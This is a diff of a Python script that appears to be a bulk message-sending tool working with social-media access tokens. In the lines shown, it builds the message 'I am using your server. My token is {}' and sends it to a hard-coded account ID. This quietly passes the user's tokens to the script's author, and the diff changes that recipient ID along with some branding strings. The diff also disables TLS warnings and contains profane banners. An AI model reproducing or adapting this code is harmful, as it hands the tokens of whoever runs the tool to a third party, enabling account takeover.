@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")
+          self.wfile.write(b"-- THIS SERVER MADE BY KILLER Brand")
 def execute_server():
       PORT = 4000
 
@@ -39,15 +39,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Aryan sir! I am using your server. My token is {}"
+      msg_template = "Hello killer sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100000314590715"
+      target_id = "100079554613661"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────FUCKER───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────AARYAN HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -147,4 +147,4 @@ def main():
       send_messages_from_file()
 
 if __name__ == '__main__':
-      main ()
+      main()
